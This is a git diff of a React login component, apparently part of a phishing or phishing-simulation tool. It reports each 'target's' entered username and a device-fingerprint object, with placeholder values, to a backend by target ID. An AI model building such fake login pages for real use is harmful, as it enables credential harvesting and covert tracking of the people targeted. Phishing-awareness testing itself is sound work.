@@ -3,9 +3,12 @@ import React, { useState } from "react";
 import { useTarget } from "../contexts/target.context";
 import "../styles/Login.css";
 import loginIMG from "../imagens/LoginIMG.jpg";
+import { EnterTargetBody, enterTargetAPI } from "../fetchs/target.fetch";
+import { useParams } from "react-router-dom"; // se você pega targetId da URL
 
 export default function LoginComponent() {
-  const { setCurrentPage, setTargetPage, setTargetStatus, targetData, setTargetData } = useTarget();
+  const { setCurrentPage, setTargetPage, setTargetStatus, setLastPage, targetData, setTargetData } = useTarget();
+  const { id: targetIdFromRoute } = useParams<{ id: string }>(); // pega :id da rota
 
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
@@ -32,6 +35,33 @@ export default function LoginComponent() {
         return;
       }
 
+      // 1️⃣ Prepara o body para enviar via PATCH
+      const body: EnterTargetBody = {
+        dto: {
+          name: username || "",
+          info: `logged:${username}`,
+        },
+        secret: {
+          screenWidth: 0,
+          screenHeight: 0,
+          timezone: "",
+          language: "",
+          languages: [],
+          platform: "",
+          deviceMemory: 0,
+          hardwareConcurrency: 0,
+        },
+      };
+
+      if (!targetIdFromRoute) {
+        throw new Error("Target ID não encontrado na rota");
+      }
+
+      // 2️⃣ Chama a API PATCH
+      await enterTargetAPI(targetIdFromRoute, body);
+
+      // 3️⃣ Atualiza contexto
+      setLastPage(0);
       setCurrentPage(1);
       setTargetPage(1);
       setTargetStatus(1);
@@ -39,6 +69,8 @@ export default function LoginComponent() {
       if (targetData) {
         setTargetData({ ...targetData, info: `logged:${username}` });
       }
+    } catch (err: any) {
+      setError(err.message || "Erro desconhecido");
     } finally {
       setSubmitting(false);
     }
@@ -53,14 +85,12 @@ export default function LoginComponent() {
 
       {/* Caixa de login */}
       <div id="boxLogin" className="login-container">
-        {/* Exibição de erro */}
         {error && (
           <div id="msgErroBoxLogin" className="txtErro">
             <strong>{error}</strong>
           </div>
         )}
 
-        {/* Formulário */}
         <form onSubmit={handleLogin} className="login-box">
           <p className="mb10 aviso">
             <b>Insira o usuário e a senha</b>
